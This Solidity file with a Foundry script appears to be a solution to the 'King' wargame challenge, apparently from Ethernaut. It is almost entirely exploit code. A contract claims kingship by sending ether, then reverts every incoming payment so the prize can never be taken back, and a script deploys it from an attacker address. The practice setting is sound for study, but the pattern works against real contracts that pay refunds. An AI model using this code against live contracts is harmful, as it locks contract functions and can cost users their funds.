// SDPX-License-Identifier: MIT

pragma solidity ^0.6.2;

import {Script} from "forge-std/Script.sol";

import {Constants} from "./Constants.s.sol";


contract KingAttack is Constants {
    uint256 private immutable i_prize;

    constructor() public payable {
        i_prize = msg.value;
    }
    
    function attack() public {
        KING_ADDRESS.call{value: i_prize}("");
    }

    receive() external payable {
        revert("I am THE KING!");
    }
}

contract KingAttacker is Constants, Script {
    uint256 private constant STARTING_PRIZE = 1000000000000000;  // 1e15

    function run() public {
        vm.startBroadcast(ATTACKER_ADDRESS);
        attack();
        vm.stopBroadcast();
    }
    
    function attack() private {
        KingAttack _attack = new KingAttack{value: STARTING_PRIZE}();
        _attack.attack();
    }
}